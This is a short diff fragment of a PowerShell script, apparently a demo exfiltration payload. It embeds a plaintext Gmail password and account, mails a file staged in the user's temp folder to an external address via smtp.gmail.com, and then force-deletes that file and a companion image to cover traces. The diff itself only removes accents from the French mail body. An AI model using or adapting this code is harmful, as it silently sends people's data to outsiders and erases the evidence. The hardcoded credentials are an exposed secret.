@@ -200,7 +200,7 @@ $PWord = ConvertTo-SecureString -String "rcotbisuqqikfaqc" -ASPlainText -Force
 $User = "trashmail4demos@gmail.com"
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord
 
-Send-MailMessage -Attachments $Env:temp\foo.txt -Body 'Jette un coup doeil à la pièce jointe' -From $Credential.UserName -To "fleurin556@headmind.com" -SMTPServer smtp.gmail.com -UseSSL -Subject Test -Port 587 -Credential $Credential
+Send-MailMessage -Attachments $Env:temp\foo.txt -Body 'Jette un coup doeil a la piece jointe' -From $Credential.UserName -To "fleurin556@headmind.com" -SMTPServer smtp.gmail.com -UseSSL -Subject Test -Port 587 -Credential $Credential
 
 Remove-Item $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
